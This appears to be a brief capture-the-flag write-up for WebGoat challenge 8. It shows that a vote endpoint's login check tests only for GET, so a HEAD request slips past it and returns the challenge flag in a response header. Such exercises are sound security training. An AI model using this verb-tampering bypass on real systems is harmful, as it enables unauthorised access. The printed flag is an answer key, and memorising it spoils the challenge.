
Votion endpoint uses 

if (request.getMethod().equals("GET")) {
            var json = Map.of("error", true, "message", "Sorry but you need to login first in order to vote");
            return ResponseEntity.status(200).body(json);
}

to check is the request is GET but it doesnt account for the other possible cases like OPTIONS which are mostly allowed to check the allowed methods

OPTIONS /WebGoat/challenge/8/vote/4/

HTTP/1.1 200 OK
Allow: GET,HEAD,OPTIONS

HEAD /WebGoat/challenge/8/vote/4

HTTP/1.1 200 OK
X-Flag: Thanks for voting, your flag is: a312181c-a941-49f1-af5d-71cded8f5876
